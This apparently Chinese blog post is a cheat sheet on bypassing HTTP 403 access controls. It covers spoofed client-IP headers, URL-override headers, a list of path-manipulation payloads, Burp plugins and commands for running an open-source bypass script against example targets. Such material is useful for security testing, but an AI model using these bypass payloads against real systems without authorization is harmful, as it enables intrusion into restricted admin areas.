---
title: 403bypass
subtitle:
date: 2024-08-15T09:31:01+08:00
slug: 36
draft:  false
author: 
  name: 东隅
  link:
  email: 735587142
  avatar: 
description:
keywords:
license:
comment: false
weight: 0
tags:
  - 通用
categories:
  - 通用
hiddenFromHomePage: false
hiddenFromSearch: false
hiddenFromRss: false
hiddenFromRelated: false
summary:
resources:
  - name: featured-image
    src: featured-image.jpg
  - name: featured-image-preview
    src: featured-image-preview.jpg
toc: true
math: false
lightgallery: false
password:
message:
repost:
  enable: true
  url:

# See details front matter: https://fixit.lruihao.cn/documentation/content-management/introduction/#front-matter



---

<!--more-->

403 Forbidden 是HTTP协议中的一个状态码(Status Code)。 可以简单的理解为**没有权限访问此站**

示例代码

```php
<?php
// 模拟用户登录状态
$isLoggedIn = true;

// 检查用户是否有权限访问资源
if (!$isLoggedIn) {
    // 如果用户没有登录，重定向到登录页面
    header("Location: /login.php");
    exit();
} else {
    // 如果用户已登录，但没有足够的权限访问资源，返回403 Forbidden状态码
    $userRole = "admin";
    if ($userRole != "admin") {
        http_response_code(403);
        echo "403 Forbidden - Access Denied";
        exit();
    } else {
        // 如果用户已登录且有足够的权限访问资源，继续执行业务逻辑
        echo "Welcome, admin!";
        // ...
    }
}
```



Bypass403：[https://github.com/iamj0ker/bypass-403](https://github.com/iamj0ker/bypass-403）、)

bypass4xx：https://github.com/lobuhi/byp4xx

DirDar：https://github.com/M4DM0e/DirDar


https://github.com/devploit/dontgo403
https://github.com/daffainfo/bypass-403



# HTTP头

```
Referer: http://192.168.56.108/adminstration/

X-Originating-IP: 127.0.0.1 

X-Remote-IP: 127.0.0.1 

X-Client-IP: 127.0.0.1 

X-Forwarded-For: 127.0.0.1 

X-Forwared-Host: 127.0.0.1 

X-Host: 127.0.0.1 

X-Custom-IP-Authorization: 127.0.0.1
```



X-Forwarded-For

<img src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202306092148502.webp" alt="image-20230609214829209" style="zoom:67%;" />



# bp插件

BurpSuite_403Bypasser 项目地址：https://github.com/sting8k/BurpSuite_403Bypasser

把`/adminstration`路径贴上去，直接就bypass了

ps:好像说还要配合knife插件

<img src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202306092153715.webp" alt="image-20230609215355486" style="zoom: 67%;" />



另外bp商店有一个403Bypasser

Bypass WAF



# 开源脚本

安装

```
git clone https://github.com/NumencyberLabs/bypass403.git
cd bypass403
pip install -r requirements.txt
python bypass403.py -u https://www.example.com/admin
```



使用

```
python3 bypass403.py -u https://www.example.com/admin
python3 bypass403.py -l 403.txt
## the output file
python3 bypass403.py -u https://www.example.com/admin -o example.txt
```







# 旁站绕过403

网站可能权限控制不严格，只是通过主机头的方式进行限制。如：只对“www.abc.com”进行了限制，没有对“xxx.abc.com”进行限制，导致可以403 ByPass。那么我只要做子域名爆破，然后就可以尝试403 ByPass。



# URL覆盖绕过403

用户可以使用`X-Original-URL`或`X-Rewrite-URL` HTTP请求标头覆盖请求URL中的路径，尝试绕过对更高级别的缓存和Web服务器的限制。
可以这样绕过的原因：有很多的web应用，只对uri地址内容进行权限检查，这就导致uri路径正常访问之后，我又覆盖了新的地址，导致403 ByPass

```http
GET / HTTP/1.1
X-Original-URL: /adminstration
X-Rewrite-URL: /adminstration
Host: www.abc.com
Host: 192.168.56.108
```





# 扩展名绕过

```
site.com/admin => 403
site.com/admin/ => 200
site.com/admin// => 200
site.com//admin// => 200
site.com/admin/* => 200
site.com/admin/*/ => 200
site.com/admin/. => 200
site.com/admin/./ => 200
site.com/./admin/./ => 200
site.com/admin/./. => 200
site.com/admin/./. => 200
site.com/admin? => 200
site.com/admin?? => 200
site.com/admin??? => 200
site.com/admin..;/ => 200
site.com/admin/..;/ => 200
site.com/%2f/admin => 200
site.com/%2e/admin => 200
site.com/admin%20/ => 200
site.com/admin%09/ => 200
site.com/%20admin%20/ => 200
```



![image-20230609221919361](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202306092219576.webp)



参考

https://www.bmabk.com/index.php/post/134220.html

